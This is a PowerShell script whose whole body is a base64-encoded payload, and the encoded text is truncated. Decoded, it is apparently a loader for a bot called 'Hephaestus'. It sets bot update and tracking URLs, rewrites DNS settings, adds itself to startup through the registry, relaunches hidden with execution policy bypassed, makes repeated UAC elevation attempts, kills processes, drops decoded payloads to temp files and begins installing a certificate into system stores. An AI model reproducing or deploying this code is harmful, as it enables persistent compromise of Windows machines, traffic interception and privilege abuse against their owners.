
$xbody = "IyMjaGVhZA0KDQokc2VydmVyID0gQCcNCnsNCiAgInVybERvYyI6ICIiLA0KICAiZGlzYWJsZWQiOiBmYWxzZSwNCiAgImRpc2FibGVWaXJ1cyI6IGZhbHNlLA0KICAic2VydmVyIjogIjEyNy4wLjAuMSIsDQogICJodG1sVGVtcGxhdGVTcG9uc29yRmlsZSI6ICJDOlxcc29mdFxcaGVwaGFlc3R1c1xccGhwXFwuXFxkb3dubG9hZC5odG1sIiwNCiAgInByaW1hcnlEbnMiOiAiMTI3LjAuMC4xIiwNCiAgInNlY29uZGFyeURucyI6ICIxMjcuMC4wLjEiLA0KICAiZXh0cmFVcGRhdGUiOiBmYWxzZSwNCiAgInVwZGF0ZVVybCI6ICJodHRwOi8vMTI3LjAuMC4xL2JvdC91cGRhdGUiLA0KICAidHJhY2siOiBmYWxzZSwNCiAgInRyYWNrU2VyaWUiOiAiam9wYSIsDQogICJ0cmFja0Rlc2t0b3AiOiBmYWxzZSwNCiAgInRyYWNrVXJsIjogImh0dHA6Ly8xMjcuMC4wLjEvYm90L3Vwc2VydCIsDQogICJhdXRvU3RhcnQiOiB0cnVlLA0KICAiYXV0b1VwZGF0ZSI6IHRydWUsDQogICJhZ2dyZXNzaXZlQWRtaW4iOiB0cnVlLA0KICAiYWdncmVzc2l2ZUFkbWluRGVsYXkiOiAzLA0KICAiYWdncmVzc2l2ZUFkbWluQXR0ZW1wdHMiOiAyLA0KICAiYWdncmVzc2l2ZUFkbWluVGltZXMiOiAzLA0KICAicHVzaGVzRm9yY2UiOiB0cnVlLA0KICAicHVzaGVzIjogW10sDQogICJzdGFydERvd25sb2Fkc0ZvcmNlIjogZmFsc2UsDQogICJzdGFydERvd25sb2FkcyI6IFtdLA0KICAic3RhcnRVcmxzRm9yY2UiOiBmYWxzZSwNCiAgInN0YXJ0VXJscyI6IFtdLA0KICAiZnJvbnRGb3JjZSI6IGZhbHNlLA0KICAiZnJvbnQiOiBbXSwNCiAgImVtYmVkZGluZ3NGb3JjZSI6IGZhbHNlLA0KICAiZW1iZWRkaW5ncyI6IFtdDQp9DQonQCB8IENvbnZlcnRGcm9tLUpzb24NCg0KDQogICAgICAgICR4ZGF0YSA9IEB7DQogICAgICAgIA0KICAgIH0NCiAgICAgICAgDQoNCiAgICAgICAgJHhmcm9udCA9IEAoDQogICAgICAgIA0KICAgICAgICApDQogICAgICAgICR4ZnJvbnRfbmFtZSA9IEAoDQogICAgICAgIA0KICAgICAgICApDQogICAgICAgICR4ZW1iZWQgPSBAKA0KICAgICAgICANCiAgICAgICAgKQ0KICAgICAgICAkeGVtYmVkX25hbWUgPSBAKA0KICAgICAgICANCiAgICAgICAgKQ0KDQpmdW5jdGlvbiBHZXQtU2NyaXB0UGF0aCB7DQogICAgJHNjcmlwdFBhdGhzID0gQCgNCiAgICAgICAgIyRNeUludm9jYXRpb24uTXlDb21tYW5kLkRlZmluaXRpb24sDQogICAgICAgICRQU0NvbW1hbmRQYXRoLA0KICAgICAgICAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5QYXRoDQogICAgKQ0KICAgIA0KICAgIGZvcmVhY2ggKCRwYXRoIGluICRzY3JpcHRQYXRocykgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkcGF0aCkgew0KICAgICAgICAgICAgICAgIHJldHVybiAkcGF0aA0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIHsNCiAgICAgICAgfQ0KICAgIH0NCn0NCmZ1bmN0aW9uIEN1c3RvbURlY29kZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRpbkNvbnRlbnQsDQogICAgICAgIFtzdHJpbmddJG91dEZpbGUNCiAgICApDQoNCiAgICAjJHN0YW5kYXJkQmFzZTY0Q2hhcnMgPSAiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLyINCiAgICAjJGN1c3RvbUJhc2U2NENoYXJzICAgPSAiUVdFUlRZVUlPUExLSkhHRkRTQVpYQ1ZCTk1hc2RmZ2hqa2xxd2VydHl1aW9wenhjdmJubTk4NzY1NDMyMTArLyINCiAgICANCiAgICAjICRkZWNvZGVkQmFzZTY0U3RyaW5nID0gJGluQ29udGVudA0KDQogICAgIyAjICRkZWNvZGVkQmFzZTY0U3RyaW5nID0gJGRlY29kZWRCYXNlNjRTdHJpbmcgLXJlcGxhY2UgKFtyZWdleF06OkVzY2FwZSgkY3VzdG9tQmFzZTY0Q2hhcnMpKSwgew0KICAgICMgIyAgICAgcGFyYW0oJG1hdGNoKQ0KICAgICMgIyAgICAgJHN0YW5kYXJkQmFzZTY0Q2hhcnNbJGN1c3RvbUJhc2U2NENoYXJzLkluZGV4T2YoJG1hdGNoLlZhbHVlKV0NCiAgICAjfQ0KDQogICAgdHJ5IHsNCiAgICAgICAgJGRlY29kZWRCeXRlcyA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkaW5Db250ZW50KQ0KICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRvdXRGaWxlLCAkZGVjb2RlZEJ5dGVzKQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIFdyaXRlLUVycm9yICJGYWlsZWQgdG8gZGVjb2RlIHRoZSBjdXN0b20gQmFzZTY0IHN0cmluZzogJF8iDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIElzRGVidWcgew0KICAgICRkZWJ1Z0ZpbGUgPSAiQzpcZGVidWcudHh0Ig0KICAgIA0KICAgIHRyeSB7DQogICAgICAgICMgQ2hlY2sgaWYgdGhlIGZpbGUgZXhpc3RzDQogICAgICAgIGlmIChUZXN0LVBhdGggJGRlYnVnRmlsZSAtUGF0aFR5cGUgTGVhZikgew0KICAgICAgICAgICAgcmV0dXJuICR0cnVlDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgIyBDYXRjaCBhbnkgZXJyb3JzIHRoYXQgb2NjdXIgZHVyaW5nIHRoZSBUZXN0LVBhdGggb3BlcmF0aW9uDQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQp9DQoNCiRnbG9iYWxEZWJ1ZyA9IElzRGVidWc7DQoNCmZ1bmN0aW9uIHdyaXRlZGJnIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJG1zZywgICBbc3RyaW5nXSRtc2cyPSIiDQogICAgKQ0KICAgICAgICBpZiAoJGdsb2JhbERlYnVnKXsNCiAgICAgICAgICAgIFdyaXRlLUhvc3QgJG1zZyArICRtc2cyDQogICAgICAgIH0NCn0NCg0KZnVuY3Rpb24gR2V0LUhlcGhhZXN0dXNGb2xkZXIgew0KICAgICRhcHBEYXRhUGF0aCA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKQ0KICAgICRoZXBoYWVzdHVzRm9sZGVyID0gSm9pbi1QYXRoICRhcHBEYXRhUGF0aCAnSGVwaGFlc3R1cycNCiAgICByZXR1cm4gJGhlcGhhZXN0dXNGb2xkZXINCn0NCg0KZnVuY3Rpb24gR2V0LUhvbGRlclBhdGggew0KICAgICRoZXBoYWVzdHVzRm9sZGVyID0gR2V0LUhlcGhhZXN0dXNGb2xkZXINCiAgICAkc2NyaXB0TmFtZSA9ICdob2xkZXInICsgJy4nICsgJ3BzMScNCiAgICAkaG9sZGVyUGF0aCA9IEpvaW4tUGF0aCAkaGVwaGFlc3R1c0ZvbGRlciAtQ2hpbGRQYXRoICRzY3JpcHROYW1lDQogICAgcmV0dXJuICRob2xkZXJQYXRoDQp9DQoNCmZ1bmN0aW9uIEdldC1Cb2R5UGF0aCB7DQogICAgJGhlcGhhZXN0dXNGb2xkZXIgPSBHZXQtSGVwaGFlc3R1c0ZvbGRlcg0KICAgICRzY3JpcHROYW1lID0gJ2JvZHknICsgJy4nICsgJ3BzMScNCiAgICAkYm9keVBhdGggPSBKb2luLVBhdGggJGhlcGhhZXN0dXNGb2xkZXIgLUNoaWxkUGF0aCAkc2NyaXB0TmFtZQ0KICAgIHJldHVybiAkYm9keVBhdGgNCn0NCg0KZnVuY3Rpb24gVGVzdC1Bcmd7IHBhcmFtIChbc3RyaW5nXSRhcmcpDQogICAgJGdsb2JhbEFyZ3MgPSAkZ2xvYmFsOmFyZ3MgLWpvaW4gJyAnDQogICAgaWYgKCRnbG9iYWxBcmdzIC1saWtlICIqJGFyZyoiKSB7DQogICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgIH0NCiAgICByZXR1cm4gJGZhbHNlDQp9IA0KDQoNCmZ1bmN0aW9uIFRlc3QtQXV0b3N0YXJ0IA0Kew0KICAgIHJldHVybiBUZXN0LUFyZyAtYXJnICJhdXRvc3RhcnQiDQp9DQoNCg0KZnVuY3Rpb24gR2V0QXJnIHsNCiAgICBwYXJhbSAoW3N0cmluZ10kYXJnKQ0KDQogICAgJGdsb2JhbEFyZ3MgPSAkZ2xvYmFsOmFyZ3MNCiAgICAkYXJnID0gJGFyZy5Ub0xvd2VyKCkNCg0KICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGdsb2JhbEFyZ3MuQ291bnQ7ICRpKyspIHsNCiAgICAgICAgJGN1cnJlbnRBcmcgPSAkZ2xvYmFsQXJnc1skaV0uVHJpbVN0YXJ0KCItIikuVG9Mb3dlcigpDQogICAgICAgIGlmICggKEFyZ3NFcXVhbCAkY3VycmVudEFyZyAkYXJnKSAtYW5kICRpICsgMSAtbHQgJGdsb2JhbEFyZ3MuQ291bnQpIHsNCiAgICAgICAgICAgIHJldHVybiAkZ2xvYmFsQXJnc1skaSArIDFdDQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gIiINCn0NCg0KZnVuY3Rpb24gU3RyVG9JbnQgew0KICAgIHBhcmFtIChbc3RyaW5nXSR2YWx1ZSkNCg0KICAgIGlmIChbc3RyaW5nXTo6SXNOdWxsT3JXaGl0ZVNwYWNlKCR2YWx1ZSkpIHsNCiAgICAgICAgcmV0dXJuIDANCiAgICB9DQoNCiAgICAkaW50VmFsdWUgPSAwDQogICAgaWYgKFtpbnRdOjpUcnlQYXJzZSgkdmFsdWUsIFtyZWZdJGludFZhbHVlKSkgew0KICAgICAgICByZXR1cm4gJGludFZhbHVlDQogICAgfQ0KDQogICAgcmV0dXJuIDANCn0NCg0KZnVuY3Rpb24gU3RyVG9Cb29sIHsNCiAgICBwYXJhbSAoW3N0cmluZ10kdmFsdWUsIFtib29sXSRkZWZhdWx0KQ0KDQogICAgaWYgKFtzdHJpbmddOjpJc051bGxPcldoaXRlU3BhY2UoJHZhbHVlKSkgew0KICAgICAgICByZXR1cm4gJGRlZmF1bHQNCiAgICB9DQoNCiAgICAkYm9vbFZhbHVlID0gJGRlZmF1bHQNCiAgICBpZiAoW2Jvb2xdOjpUcnlQYXJzZSgkdmFsdWUuVG9Mb3dlcigpLCBbcmVmXSRib29sVmFsdWUpKSB7DQogICAgICAgIHJldHVybiAkYm9vbFZhbHVlDQogICAgfQ0KDQogICAgcmV0dXJuICRkZWZhdWx0DQp9DQoNCmZ1bmN0aW9uIFJlZ1dyaXRlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHJlZ2lzdHJ5UGF0aCwNCiAgICAgICAgW3N0cmluZ10ka2V5TmFtZSwNCiAgICAgICAgW3N0cmluZ10kdmFsdWUNCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRyZWdpc3RyeVBhdGgpIHsNCiAgICAgICAgICAgICRjdXJyZW50VmFsdWUgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGtleU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCg0KICAgICAgICAgICAgaWYgKCRjdXJyZW50VmFsdWUuJGtleU5hbWUgLWVxICR2YWx1ZSkgew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJUaGUgJyRrZXlOYW1lJyBrZXkgaXMgYWxyZWFkeSBzZXQgd2l0aCB0aGUgY29ycmVjdCB2YWx1ZS4iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRrZXlOYW1lIC1WYWx1ZSAkdmFsdWUNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiJyRrZXlOYW1lJyBrZXkgdXBkYXRlZCB3aXRoIHRoZSBjb3JyZWN0IHZhbHVlLiIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHJlZ2lzdHJ5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICAgICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRrZXlOYW1lIC1WYWx1ZSAiJHZhbHVlIiAtUHJvcGVydHlUeXBlIFN0cmluZyAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICAgICAgd3JpdGVkYmcgIicka2V5TmFtZScga2V5IGFkZGVkIHRvIHN0YXJ0dXAuIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgd3JpdGVkYmcgIkVycm9yIHdoaWxlIGFkZGluZy91cGRhdGluZyB0aGUgJyRrZXlOYW1lJyBrZXk6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgIH0NCn0NCg0KZnVuY3Rpb24gUmVnV3JpdGVJbnQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcmVnaXN0cnlQYXRoLA0KICAgICAgICBbc3RyaW5nXSRrZXlOYW1lLA0KICAgICAgICBbaW50XSR2YWx1ZQ0KICAgICkNCg0KICAgIFJlZ1dyaXRlIC1yZWdpc3RyeVBhdGggJHJlZ2lzdHJ5UGF0aCAta2V5TmFtZSAka2V5TmFtZSAtdmFsdWUgJHZhbHVlLlRvU3RyaW5nKCkNCn0NCg0KZnVuY3Rpb24gUmVnUmVhZCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRyZWdpc3RyeVBhdGgsDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUNCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRyZWdpc3RyeVBhdGgpIHsNCiAgICAgICAgICAgICRjdXJyZW50VmFsdWUgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGtleU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgIHJldHVybiAkY3VycmVudFZhbHVlLiRrZXlOYW1lDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiRXJyb3IgcmVhZGluZyByZWdpc3RyeSBrZXkgJyRrZXlOYW1lJyBmcm9tICckcmVnaXN0cnlQYXRoJzogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgfQ0KDQogICAgcmV0dXJuICIiDQp9DQoNCmZ1bmN0aW9uIFJlZ1JlYWRJbnQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcmVnaXN0cnlQYXRoLA0KICAgICAgICBbc3RyaW5nXSRrZXlOYW1lDQogICAgKQ0KDQogICAgJHZhbHVlID0gUmVnUmVhZCAtcmVnaXN0cnlQYXRoICRyZWdpc3RyeVBhdGggLWtleU5hbWUgJGtleU5hbWUNCiAgICByZXR1cm4gU3RyVG9JbnQgLXZhbHVlICR2YWx1ZQ0KfQ0KDQpmdW5jdGlvbiBSZWdSZWFkQm9vbCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRyZWdpc3RyeVBhdGgsDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUsDQogICAgICAgIFtib29sXSRkZWZhdWx0DQogICAgKQ0KDQogICAgJHZhbHVlID0gUmVnUmVhZCAtcmVnaXN0cnlQYXRoICRyZWdpc3RyeVBhdGggLWtleU5hbWUgJGtleU5hbWUNCiAgICByZXR1cm4gU3RyVG9Cb29sIC12YWx1ZSAkdmFsdWUgLWRlZmF1bHQgJGRlZmF1bHQNCn0NCg0KJGhlcGFlc3R1c1JlZyA9ICJIS0NVOlxTb2Z0d2FyZVxIZXBoYWVzdHVzIg0KDQpmdW5jdGlvbiBSZWdXcml0ZVBhcmFtIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUsDQogICAgICAgIFtzdHJpbmddJHZhbHVlDQogICAgKQ0KICAgICRyZWdpc3RyeVBhdGggPSAkZ2xvYmFsOmhlcGFlc3R1c1JlZw0KICAgIFJlZ1dyaXRlIC1yZWdpc3RyeVBhdGggJHJlZ2lzdHJ5UGF0aCAta2V5TmFtZSAka2V5TmFtZSAtdmFsdWUgJHZhbHVlDQp9DQoNCmZ1bmN0aW9uIFJlZ1dyaXRlUGFyYW1JbnQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcmVnaXN0cnlQYXRoLA0KICAgICAgICBbc3RyaW5nXSRrZXlOYW1lLA0KICAgICAgICBbaW50XSR2YWx1ZQ0KICAgICkNCiAgICBSZWdXcml0ZVBhcmFtIC1rZXlOYW1lICRrZXlOYW1lIC12YWx1ZSAkdmFsdWUuVG9TdHJpbmcoKQ0KfQ0KDQpmdW5jdGlvbiBSZWdXcml0ZVBhcmFtQm9vbCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRyZWdpc3RyeVBhdGgsDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUsDQogICAgICAgIFtib29sXSR2YWx1ZQ0KICAgICkNCiAgICBSZWdXcml0ZVBhcmFtIC1rZXlOYW1lICRrZXlOYW1lIC12YWx1ZSAkdmFsdWUuVG9TdHJpbmcoKQ0KfQ0KDQpmdW5jdGlvbiBSZWdSZWFkUGFyYW0gew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10ka2V5TmFtZQ0KICAgICkNCiAgICAkcmVnaXN0cnlQYXRoID0gJGdsb2JhbDpoZXBhZXN0dXNSZWcNCiAgICByZXR1cm4gUmVnUmVhZCAtcmVnaXN0cnlQYXRoICRyZWdpc3RyeVBhdGggLWtleU5hbWUgJGtleU5hbWUNCn0NCg0KZnVuY3Rpb24gUmVnUmVhZFBhcmFtSW50IHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGtleU5hbWUNCiAgICApDQogICAgJHJlZ2lzdHJ5UGF0aCA9ICRnbG9iYWw6aGVwYWVzdHVzUmVnDQogICAgcmV0dXJuIFJlZ1JlYWRJbnQgLXJlZ2lzdHJ5UGF0aCAkcmVnaXN0cnlQYXRoIC1rZXlOYW1lICRrZXlOYW1lDQp9DQoNCmZ1bmN0aW9uIFJlZ1JlYWRQYXJhbUJvb2wgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10ka2V5TmFtZSwgICAgICAgIFtib29sXSRkZWZhdWx0DQogICAgKQ0KICAgICRyZWdpc3RyeVBhdGggPSAkZ2xvYmFsOmhlcGFlc3R1c1JlZw0KICAgIHJldHVybiBSZWdSZWFkQm9vbCAtcmVnaXN0cnlQYXRoICRyZWdpc3RyeVBhdGggLWtleU5hbWUgJGtleU5hbWUgLWRlZmF1bHQgJGRlZmF1bHQNCn0NCg0KZnVuY3Rpb24gR2V0QXJnSW50IHsNCiAgICBwYXJhbSAoW3N0cmluZ10kYXJnKQ0KDQogICAgcmV0dXJuIFN0clRvSW50IChHZXRBcmcgJGFyZykNCn0NCg0KZnVuY3Rpb24gRW5zdXJlRGFzaFByZWZpeCB7DQogICAgcGFyYW0gKFtzdHJpbmddJHZhbHVlKQ0KDQogICAgaWYgKC1ub3QgJHZhbHVlLlN0YXJ0c1dpdGgoIi0iKSkgew0KICAgICAgICByZXR1cm4gIi0iICsgJHZhbHVlDQogICAgfQ0KICAgIHJldHVybiAkdmFsdWUNCn0NCg0KZnVuY3Rpb24gQXJnc0VxdWFsIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGFyZzEsDQogICAgICAgIFtzdHJpbmddJGFyZzINCiAgICApDQoNCiAgICAjIE5vcm1hbGl6ZSBib3RoIGFyZ3VtZW50cyAocmVtb3ZlIGxlYWRpbmcgIi0iIGFuZCBjb21wYXJlIGNhc2UtaW5zZW5zaXRpdmVseSkNCiAgICAkbm9ybWFsaXplZEFyZzEgPSAkYXJnMS5UcmltU3RhcnQoIi0iKS5Ub0xvd2VyKCkNCiAgICAkbm9ybWFsaXplZEFyZzIgPSAkYXJnMi5UcmltU3RhcnQoIi0iKS5Ub0xvd2VyKCkNCg0KICAgIHJldHVybiAkbm9ybWFsaXplZEFyZzEgLWVxICRub3JtYWxpemVkQXJnMg0KfQ0KDQpmdW5jdGlvbiBSdW5NZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRzY3JpcHQsIA0KICAgICAgICBbYm9vbF0gJHJlcGFzc0FyZ3MsDQogICAgICAgIFtzdHJpbmddJGFyZ05hbWUsDQogICAgICAgIFtzdHJpbmddJGFyZ1ZhbHVlLA0KICAgICAgICBbYm9vbF0kdWFjDQogICAgKQ0KDQogICAgJGFyZ05hbWUgPSBFbnN1cmVEYXNoUHJlZml4IC12YWx1ZSAkYXJnTmFtZQ0KDQogICAgJHNjcmlwdFBhdGggPSAkc2NyaXB0DQogICAgDQogICAgJGxvY2FsID0gQCgiLUV4ZWN1dGlvblBvbGljeSIsICJCeXBhc3MiLCAiLUZpbGUiLCAiIiIkc2NyaXB0UGF0aCIiIikNCiAgICANCiAgICBpZiAoJHJlcGFzc0FyZ3MgLWVxICR0cnVlKSB7DQogICAgICAgICRnbG9iYWxBcmdzID0gJGdsb2JhbDphcmdzDQogICAgICAgICRmaWx0ZXJlZEFyZ3MgPSBAKCkNCiAgICAgICAgJHNraXBOZXh0ID0gJGZhbHNlDQoNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkZ2xvYmFsQXJncy5Db3VudDsgJGkrKykgew0KICAgICAgICAgICAgaWYgKCRza2lwTmV4dCkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJHNraXBOZXh0ID0gJGZhbHNlDQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaWYgKEFyZ3NFcXVhbCAkZ2xvYmFsQXJnc1skaV0gJGFyZ05hbWUpIHsNCiAgICAgICAgICAgICAgICAkc2tpcE5leHQgPSAkdHJ1ZQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICRmaWx0ZXJlZEFyZ3MgKz0gJGdsb2JhbEFyZ3NbJGldDQogICAgICAgIH0NCiAgICAgICAgJGdsb2JhbEFyZ3MgPSAkZmlsdGVyZWRBcmdzDQogICAgICAgICRsb2NhbCArPSAkZ2xvYmFsQXJncw0KICAgICAgICBpZiAoLW5vdCBbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkYXJnTmFtZSkgLWFuZCAkYXJnTmFtZSAtbmUgIi0iKSB7DQogICAgICAgICAgICAkbG9jYWwgKz0gJGFyZ05hbWUNCiAgICAgICAgICAgICRsb2NhbCArPSAkYXJnVmFsdWUNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICRhcmd1bWVudExpc3QgPSAiIg0KICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGxvY2FsLkNvdW50OyAkaSArPSAxKSB7DQogICAgICAgICRhcmcgPSAkbG9jYWxbJGldDQogICAgICAgICRhcmd1bWVudExpc3QgKz0gIiRhcmcgIg0KICAgIH0NCg0KICAgIHdyaXRlZGJnICJzdGFydGluZyAgJGFyZ3VtZW50TGlzdCINCg0KICAgIGlmICgkZ2xvYmFsRGVidWcpDQogICAgew0KICAgICAgICBpZiAoJHVhYyAtZXEgJHRydWUpIHsNCiAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGUgLVZlcmIgUnVuQXMgLVdpbmRvd1N0eWxlIE5vcm1hbCAtQXJndW1lbnRMaXN0ICRhcmd1bWVudExpc3QNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIE5vcm1hbCAtQXJndW1lbnRMaXN0ICRhcmd1bWVudExpc3QNCiAgICAgICAgfQ0KICAgIH0NCiAgICBlbHNlIA0KICAgIHsNCiAgICAgICAgaWYgKCR1YWMgLWVxICR0cnVlKSB7DQogICAgICAgICAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1WZXJiIFJ1bkFzIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUFyZ3VtZW50TGlzdCAkYXJndW1lbnRMaXN0DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUFyZ3VtZW50TGlzdCAkYXJndW1lbnRMaXN0DQogICAgICAgIH0NCiAgICB9DQoNCn0NCg0KZnVuY3Rpb24gSXNFbGV2YXRlZA0Kew0KICAgIGlmICgtTk9UIChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWxdIFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IpKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCiAgICByZXR1cm4gJHRydWUNCn0NCg0KDQpmdW5jdGlvbiBHZXQtRW52UGF0aHMgew0KICAgICRhID0gR2V0LUxvY2FsQXBwRGF0YVBhdGgNCiAgICAkYiA9ICBHZXQtQXBwRGF0YVBhdGgNCiAgICByZXR1cm4gQCgkYSAsICRiKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGVtcEZpbGUgew0KICAgICR0ZW1wUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBQYXRoKCkNCiAgICAkdGVtcEZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KICAgIHJldHVybiAkdGVtcEZpbGUNCn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsQXBwRGF0YVBhdGggew0KICAgIHJldHVybiBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdOjpMb2NhbEFwcGxpY2F0aW9uRGF0YSkNCn0NCg0KZnVuY3Rpb24gR2V0LUFwcERhdGFQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6QXBwbGljYXRpb25EYXRhKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHJvZmlsZVBhdGggew0KICAgIHJldHVybiBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdOjpVc2VyUHJvZmlsZSkNCn0NCg0KZnVuY3Rpb24gQ2xvc2UtUHJvY2Vzc2VzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmdbXV0kcHJvY2Vzc2VzDQogICAgKQ0KDQogICAgZm9yZWFjaCAoJHByb2Nlc3MgaW4gJFByb2Nlc3Nlcykgew0KICAgICAgICAkY29tbWFuZCA9ICJ0YXNra2lsbC5leGUgL2ltICRwcm9jZXNzIC9mIg0KICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAkY29tbWFuZA0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ2VydC1Xb3JrIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW3N0cmluZ10gJGNvbnRlbnRTdHJpbmcNCiAgICApDQogICAgJG91dHB1dEZpbGVQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcEZpbGVOYW1lKCkNCiAgICBDdXN0b21EZWNvZGUgLWluQ29udGVudCAkY29udGVudFN0cmluZyAtb3V0RmlsZSAkb3V0cHV0RmlsZVBhdGgNCg0KICAgIEluc3RhbGwtQ2VydGlmaWNhdGVUb1N0b3JlcyAtQ2VydGlmaWNhdGVGaWxlUGF0aCAkb3V0cHV0RmlsZVBhdGggLVBhc3N3b3J